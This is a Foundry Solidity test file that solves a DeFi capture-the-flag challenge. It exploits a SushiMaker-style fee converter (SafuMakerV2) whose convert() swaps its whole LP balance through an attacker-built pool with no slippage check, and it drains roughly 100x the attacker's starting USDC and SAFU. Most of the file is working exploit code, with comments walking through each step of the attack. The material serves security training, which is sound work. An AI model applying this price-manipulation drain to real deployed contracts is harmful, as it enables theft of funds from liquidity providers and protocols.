// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// utilities
import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
// core contracts
import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IWETH} from "@uniswap/v2-periphery/contracts/interfaces/IWETH.sol";
import {Token} from "src/other/Token.sol";
import {SafuMakerV2} from "src/free-lunch/SafuMakerV2.sol";


contract Testing is Test {

    address attacker = makeAddr('attacker');
    address o1 = makeAddr('o1');
    address o2 = makeAddr('o2');
    address admin = makeAddr('admin'); // should not be used
    address adminUser = makeAddr('adminUser'); // should not be used

    IUniswapV2Factory safuFactory;
    IUniswapV2Router02 safuRouter;
    IUniswapV2Pair safuPair; // USDC-SAFU trading pair
    IWETH weth;
    Token usdc;
    Token safu;
    SafuMakerV2 safuMaker;

    /// preliminary state
    function setUp() public {

        // funding accounts
        vm.deal(admin, 10_000 ether);
        vm.deal(attacker, 10_000 ether);
        vm.deal(adminUser, 10_000 ether);

        // deploying token contracts
        vm.prank(admin);
        usdc = new Token('USDC','USDC');

        address[] memory addresses = new address[](2);
        uint256[] memory amounts = new uint256[](2);

        addresses[0]=admin; addresses[1]=attacker;
        amounts[0]=1_000_000e18; amounts[1]=100e18;
        vm.prank(admin);
        usdc.mintPerUser(addresses, amounts);

        vm.prank(admin);
        safu = new Token('SAFU','SAFU');

        addresses[0]=admin; addresses[1]=attacker;
        amounts[0]=1_000_000e18; amounts[1]=100e18;
        vm.prank(admin);
        safu.mintPerUser(addresses, amounts);

        // deploying SafuSwap + SafuMaker contracts
        weth = IWETH(
            deployCode("src/other/uniswap-build/WETH9.json")
        );
        safuFactory = IUniswapV2Factory(
            deployCode(
                "src/other/uniswap-build/UniswapV2Factory.json",
                abi.encode(admin)
            )
        );
        safuRouter = IUniswapV2Router02(
            deployCode(
                "src/other/uniswap-build/UniswapV2Router02.json",
                abi.encode(address(safuFactory),address(weth))
            )
        );

        vm.prank(admin);
        safuMaker = new SafuMakerV2(
            address(safuFactory),
            0x1111111111111111111111111111111111111111, // sushiBar address, irrelevant for exploit
            address(safu),address(usdc)
        );
        vm.prank(admin);
        safuFactory.setFeeTo(address(safuMaker));

        // --adding initial liquidity
        vm.prank(admin);
        usdc.approve(address(safuRouter),type(uint).max);
        vm.prank(admin);
        safu.approve(address(safuRouter),type(uint).max);

        vm.prank(admin);
        safuRouter.addLiquidity(
            address(usdc),address(safu),
            1_000_000e18,
            1_000_000e18,
            0,0,
            admin,block.timestamp
        );

        // --getting the USDC-SAFU trading pair
        safuPair = IUniswapV2Pair(safuFactory.getPair(address(usdc),address(safu)));
        
        // --simulates trading activity, as LP is issued to feeTo address for trading rewards
        vm.prank(admin);
        safuPair.transfer(address(safuMaker),10_000e18); // 1% of LP

    }

    /// solves the challenge
    function testChallengeExploit() public {
        vm.startPrank(attacker,attacker);

        // implement solution here

        //This time this will be not an vulerability of the code but about the logic inside safuMaker
        
        //First we LP the pool USDC-SAFU
        usdc.approve(address(safuRouter),type(uint).max);
        safu.approve(address(safuRouter),type(uint).max);
        safuRouter.addLiquidity(
            address(usdc),address(safu),
            80e18,
            80e18,
            0,0,
            attacker,block.timestamp
        );
        //LP safuPair = 80000000000000000000

        // --getting the USDC-SAFU trading pair
        safuPair = IUniswapV2Pair(safuFactory.getPair(address(usdc),address(safu)));
        console.log("LP safuPair of attacker : ",safuPair.balanceOf(address(attacker)));

        //Then we will create a new POOL (LP USDC-SAFU)-SAFU for our exploit 
        safuPair.approve(address(safuRouter),type(uint).max);
        safuRouter.addLiquidity(
            address(safuPair),address(safu),
            safuPair.balanceOf(attacker),
            5e18,
            0,0,
            address(attacker),block.timestamp
        );
        //LP sifuPair = 19999999999999999000
        
        // --getting the LP(USDC-SAFU)-SAFU trading pair
        IUniswapV2Pair sifuPair = IUniswapV2Pair(safuFactory.getPair(address(safuPair),address(safu)));
        console.log("LP sifuPair : ",sifuPair.balanceOf(address(attacker)));

        (uint256 reserve0, uint256 reserve1, ) = sifuPair.getReserves();
        console.log("reserveO : ",reserve0," reserve1 : ",reserve1 );
        //reserveO :  5000000000000000000  reserve1 :  80000000000000000000

        //Now wz will proceed the exploit
        //When we are calling  convert() from safuMaker it will burn the lp of the pool and then convert the entire balance of one of the token into SAFU token
        // That's the point the ENTIRE balance and not the amount get from the burn of the LP due to L97-98 inside safuMaker.sol
        //So if we send some LP of the sifuPair to safuMaker and then call convert()
        //SafuMaker will burn the LP, he will get LP(USDC-SAFU) and SAFU token
        //And then he will swap all the LP(USDC-SAFU) to SAFU with our pool sifuPair
        //Because safuMaker directly call the swap() function of univ2 there is no check about amountMin for example
        //at the end of the swap safuMaker will get the 5e18 SAFU token of the pool sifuPair but he will loose 10_000e18 of LP(USDC-SAFU) 
        //Now the sifuPair has almost none SAFU token and lot of LP(USDC-SAFU)
        //The attacker is the only LP of the sifuPair 
        //When removing liquidity, the attacker will get all the LP(USDC-SAFU)
        //Then attacker can remove liquidity of the safuPair and get USDC and SAFU
        console.log("balance token SAFU of bar address of safuMaker : ",safu.balanceOf(address(0x1111111111111111111111111111111111111111)));
        // = 0
        console.log("LP safuPair of safuMaker: ",safuPair.balanceOf(address(safuMaker)));
        // = 10000000000000000000000

        sifuPair.transfer(address(safuMaker),1e18); //don't care about the amount
        safuMaker.convert(address(safuPair),address(safu)); //proceed to exploit
        
        console.log("balance token SAFU of bar address of safuMaker : ",safu.balanceOf(address(0x1111111111111111111111111111111111111111)));
        // = 4964079559099971064 , safuMaker got ~= 5e18
        console.log("LP safuPair of safuMaker: ",safuPair.balanceOf(address(safuMaker)));
        // = 0 , safuMaker loose all LP

        (reserve0,reserve1, ) = sifuPair.getReserves();
        console.log("reserveO : ",reserve0," reserve1 : ",reserve1 );
        // reserveO :  35920440900028936  reserve1 :  10080000000000000000000

        //remove liquidity in order to get SAFU and LP(USDC-SAFU)
        sifuPair.approve(address(safuRouter),type(uint).max);
        safuRouter.removeLiquidity(
            address(safuPair),address(safu),
            sifuPair.balanceOf(attacker),
            0,0,
            address(attacker),block.timestamp
        );

        console.log("LP safuPair of attacker: ",safuPair.balanceOf(address(attacker)));
        // LP safuPair of attacker:  10077497135616033822768

        // //remove liquidity in order to get SAFU and USDC
        safuRouter.removeLiquidity(
            address(usdc),address(safu),
            safuPair.balanceOf(attacker),
            0,0,
            address(attacker),block.timestamp
        );
        console.log("usdc attacker : ",usdc.balanceOf(address(attacker)));
        // usdc attacker :  10097497135616033822768
        console.log("safu attacker : ",safu.balanceOf(address(attacker)));
        // safu attacker :  10092533047137887007949

        vm.stopPrank();
        validation();
    }

    /// expected final state
    function validation() public {

        // attacker has increased both SAFU and USDC funds by at least 50x
        assertGe(usdc.balanceOf(attacker),5_000e18);
        assertGe(safu.balanceOf(attacker),5_000e18);

    }

}